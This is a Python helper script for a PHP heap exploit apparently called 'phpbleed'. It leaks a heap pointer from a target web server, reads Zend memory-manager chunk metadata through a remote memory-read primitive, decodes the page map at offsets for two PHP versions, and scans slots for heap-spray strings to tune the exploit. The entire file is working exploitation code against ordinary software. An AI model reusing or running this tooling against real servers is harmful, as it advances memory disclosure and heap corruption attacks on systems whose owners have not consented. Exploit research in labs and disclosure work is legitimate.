#!/usr/bin/env python3
"""Determine the ZendMM page-map data offset for a lane empirically.
Leaks a heap_ref, reads the chunk meta window, then decodes the page map
at BOTH known layout offsets (0x1C0 = php <=8.4-ish, 0x1F8 = php 8.5.x),
prints the bin-320 SRUN pages each candidate finds, and probes a few slots
for our 280-byte spray strings to confirm which offset is the TRUE one.

Usage: diag_mapoff.py http://127.0.0.1:PORT/
"""
import importlib.util
import struct
import sys

spec = importlib.util.spec_from_file_location('pb', 'phpbleed-bastet.py')
pb = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pb)

BIN_SIZES = [8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 160, 192,
             224, 256, 320, 384, 448, 512, 640, 768, 896, 1024, 1280,
             1536, 1792, 2048, 2304, 2560, 3072]
CANDIDATES = [0x1C0, 0x1F8]  # data offsets: 8.2 layout first, 8.5 second


def main(url):
    t = pb.Target(url)
    hr = pb.heap_leak(t)
    if not hr:
        print("heap leak failed")
        return 1
    print(f"heap_ref = {hr:#x}")
    chunk = hr & ~0x1FFFFF
    r = pb.read_at(t, chunk + 0x40, timeout=4)
    if r is None:
        print("chunk meta read failed")
        return 1
    slen, data = r
    print(f"meta window: slen={slen} len(data)={len(data)}")
    if len(data) < 0x1F8 + 512 * 4:
        print("window too small to test both offsets")
        return 1

    for off in CANDIDATES:
        print(f"\n=== candidate MAP_OFF=0x{off:x} (page map @ chunk+0x{0x58+off:x}) ===")
        sruns, bad = {}, 0
        for pn in range(1, 512):
            info = struct.unpack_from('<I', data, off + pn * 4)[0]
            if info == 0:
                continue
            is_srun = (info & 0x80000000) != 0
            is_lrun = (info & 0x40000000) != 0
            b = info & 0x1F
            fc = (info >> 16) & 0x1FF
            if is_srun and not is_lrun and b < len(BIN_SIZES):
                sruns.setdefault(b, []).append((pn, fc))
            elif is_lrun and not is_srun and fc <= 512:
                pass  # plausible large run
            else:
                bad += 1
        print(f"  structurally-invalid entries: {bad}")
        for b, lst in sorted(sruns.items()):
            print(f"  SRUN bin {b} ({BIN_SIZES[b]}B): {lst[:6]}"
                  + (" ..." if len(lst) > 6 else ""))
        pages = sruns.get(16, [])
        hit = None
        for pn, fc in pages[:2]:
            run_start = chunk + pn * 0x1000
            print(f"  probing bin-320 run page {pn} (free_count={fc})")
            for slot in range(40):
                addr = run_start + slot * 320
                r2 = pb.read_at(t, addr, timeout=3)
                if r2 is None:
                    continue
                if r2[0] == pb.SPRAY_LEN:
                    hit = (pn, slot, addr)
                    print(f"  *** SPRAY FOUND: page {pn} slot {slot} @ {addr:#x}")
                    break
            if hit:
                break
        print(f"  => verdict: MAP_OFF=0x{off:x} is "
              f"{'TRUE (spray confirmed)' if hit else 'not confirmed'}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1]))
